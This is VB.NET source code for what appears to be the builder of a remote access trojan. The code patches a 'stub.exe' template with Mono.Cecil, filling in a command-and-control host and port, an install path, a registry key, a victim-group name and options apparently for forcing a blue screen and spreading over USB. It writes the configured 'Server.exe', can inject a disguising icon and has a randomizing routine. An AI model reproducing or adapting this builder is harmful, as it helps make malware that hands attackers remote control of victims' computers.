Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports Mono.Cecil
Imports Mono.Cecil.Cil
Imports Mono.Collections.Generic
Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms

Public Class Builder
    Dim ic As String

    Public Sub New()
        AddHandler MyBase.Load, New EventHandler(AddressOf Me.Builder_Load)
        Me.ic = Nothing
        Me.InitializeComponent()
    End Sub

    Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox1.CheckedChanged
        If CheckBox1.Checked Then
            If (PictureBox1.Image Is Nothing) Then
                Dim dialog As New OpenFileDialog
                dialog.Filter = "Icon|*.ico"
                dialog.Title = "Choose Icon"
                dialog.FileName = ""
                If (dialog.ShowDialog = DialogResult.OK) Then
                    ic = dialog.FileName
                    PictureBox1.Image = Image.FromFile(ic)
                End If
            End If
        Else
            PictureBox1.Image = Nothing
        End If
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim dialog As New SaveFileDialog
        dialog.Filter = "EXE|*.exe"
        dialog.FileName = "Server"
        If (dialog.ShowDialog = DialogResult.OK) Then

            If IO.File.Exists(Application.StartupPath & "\stub.exe") Then
            Else
                MsgBox("No Stub File detected in : " & Application.StartupPath)
                Exit Sub
            End If

            Dim definition As AssemblyDefinition = AssemblyDefinition.ReadAssembly((Application.StartupPath & "\stub.exe"))
            Dim definition2 As TypeDefinition
            For Each definition2 In definition.MainModule.GetTypes
                Dim definition3 As MethodDefinition
                For Each definition3 In definition2.Methods
                    If (definition3.Name = ".ctor") Then
                        Dim enumerator As IEnumerator(Of Instruction) = Nothing
                        Try
                            enumerator = definition3.Body.Instructions.GetEnumerator
                            Do While enumerator.MoveNext
                                Dim current As Instruction = enumerator.Current
                                If (current.OpCode.Code = Code.Ldstr) Then
                                    Dim str As String = current.Operand.ToString
                                    If (str = "%vn%") Then
                                        Dim vN As TextBox = Me.VN
                                        Dim text As String = vN.Text
                                        vN.Text = text
                                        current.Operand = FN.ENB([text])
                                    Else
                                        If (str = "%host%") Then
                                            current.Operand = host.Text
                                            Continue Do
                                        End If
                                        If (str = "%port%") Then
                                            current.Operand = port.Value.ToString
                                            Continue Do
                                        End If
                                        If (str = "%exe%") Then
                                            current.Operand = exe.Text
                                            Continue Do
                                        End If
                                        If (str = "%bsod%") Then
                                            current.Operand = bsod.Checked.ToString
                                            Continue Do
                                        End If
                                        If (str = "%dir%") Then
                                            current.Operand = dir.Text.Replace("%", "")
                                            Continue Do
                                        End If
                                        If (str = "%rg%") Then
                                            current.Operand = FN.getMD5Hash((dir.Text.Replace("%", "") & "\" & exe.Text))
                                            Continue Do
                                        End If
                                        If (str = "%usb%") Then
                                            current.Operand = US.Checked.ToString
                                        End If
                                    End If
                                End If
                            Loop
                        Finally
                            enumerator.Dispose()
                        End Try
                    End If
                Next
            Next
            definition.Write(dialog.FileName)
            If CheckBox1.Checked Then
                Ico.InjectIcon(dialog.FileName, ic)
            End If
            FN.STV("host", host.Text)
            FN.STV("us", US.Checked.ToString)
            FN.STV("p", Conversions.ToString(port.Value))
            FN.STV("exe", exe.Text)
            FN.STV("dir", Conversions.ToString(dir.SelectedIndex))
            FN.STV("vn", VN.Text)
            FN.STV("bsod", bsod.Checked.ToString)
            FN.STV("ico", ic)
            If rnz.Checked Then
                T1.Visible = True
                T1.Dock = DockStyle.Fill
                T1.BringToFront()
                Dim mon As New MON
                mon.T1 = T1
                mon.randz(dialog.FileName)
            End If
            Interaction.MsgBox(dialog.FileName, MsgBoxStyle.ApplicationModal, "DONE!")
            Close()
        End If
    End Sub

    Private Sub Builder_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        dir.SelectedIndex = 0
        host.Text = FN.GTV("host", host.Text)
        port.Value = Conversions.ToDecimal(FN.GTV("p", Conversions.ToString(port.Value)))
        exe.Text = FN.GTV("exe", exe.Text)
        dir.SelectedIndex = Conversions.ToInteger(FN.GTV("dir", Conversions.ToString(dir.SelectedIndex)))
        VN.Text = FN.GTV("vn", VN.Text)
        bsod.Checked = Conversions.ToBoolean(FN.GTV("bsod", bsod.Checked.ToString))
        US.Checked = Conversions.ToBoolean(FN.GTV("us", "FALSE"))
        If (Convert.ToDouble(port.Value) <> Conversions.ToDouble(FN.GTV("port", Conversions.ToString(port.Value)))) Then
            port.Value = Conversions.ToDecimal(FN.GTV("port", Conversions.ToString(port.Value)))
        End If
        Try
            Dim icon As New Icon(FN.GTV("ico", ""))
            ic = FN.GTV("ico", "")
            PictureBox1.Image = icon.ToBitmap
            CheckBox1.Checked = True
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError()
        End Try
    End Sub

End Class
